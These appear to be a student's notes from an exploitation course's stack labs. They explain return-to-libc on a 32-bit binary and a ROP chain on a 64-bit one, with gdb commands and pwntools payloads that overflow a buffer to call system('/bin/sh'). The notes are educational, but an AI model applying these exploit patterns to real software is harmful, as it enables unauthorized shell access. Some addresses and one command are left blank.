### Stack 5: 
#### Class Notes: 
remember to run checksec on new files NX is enabled: no place in virtual memory that is rwx which means code injection wont work code reuse is needed. 
Need to use LibC functions useful LibC functions: system passes a command to the shell; combination of fork() and exec() 

system(/bin/sh) will open a shell system always returns to use these functions we need to find LibC and understand calling convention 
2. step 1: find addresses find the address of system():
    
    ```
    p *system
    ```
    
    find the address of exit():
    
    ```
    p *exit
    ```
    
    step 2: set up arguments in the way system() expects 32 bit calling convention arguments are placed on the stack keep in mind that the ret command needs the address of the function on top of the stack before the arguments how the stack should look: address of system() <- rsp function for system to return to after completion argument step 3: use ret to call system code:
    
    ```
    offset_ret = 76 #found with cyclic
    addr_system = #p *system
    
    #/bin/sh
    addr_str = #find in memory with the search-pattern command
    addr_exit = #p *exit
    
    p.sendline(flat({offset_ret:addr_system,offset_ret+4:addr_exit,offset_ret+8:addr_str}))
    ```
    
    >[!note] you will see something like detach after child process or something. This means that it worked, probably. You will have to run it outside of GDB in order to be sure
    >
#### Useful commands: find the address of the pattern searched for:
    
    ```
    search-pattern /bin/sh address range
    ```
    
    can also use
    
    ```
    ???
    ```
    
    instead of an address range double check with
    
    ```
    x/s address
    ```
    
    grab the top 4 bytes of the stack:
    
    ```
    x/wx $esp
    ```
    

NEW

3.  _[_2:47 PM_]_
    
    ------------
    

### Stack 6: 
#### class Notes: 
similar to stack 5, but this time it is a 64bit binary main difference here is that arguments are passed through registers rather than the stack the problem here is that manipulating the registers is harder than manipulating the stack we will have to use ROP gadgets to manipulate the registers find all the possible gadgets in a binary:
    
    ```
    ROPgadget --binary (name)
    ```
    
code:
    
    ```
    #pop rdi ; ret
    addr_gad = 0x4006f3 #found with ROPgadget
    addr_gad_ret = #found with ROPgadget
    addr_binsh = #found with search-pattern
    addr_system = #found with p *system
    
    offset_ret = 104 #found with cyclic
    
    
    p.sendline(flat({offset_ret:addr_gad_ret},addr_gad,addr_binsh,addr_system,addr_exit))
    ```
    
dealing with MOVAPPS with a fun and cool gadget: just add some returns to align the stack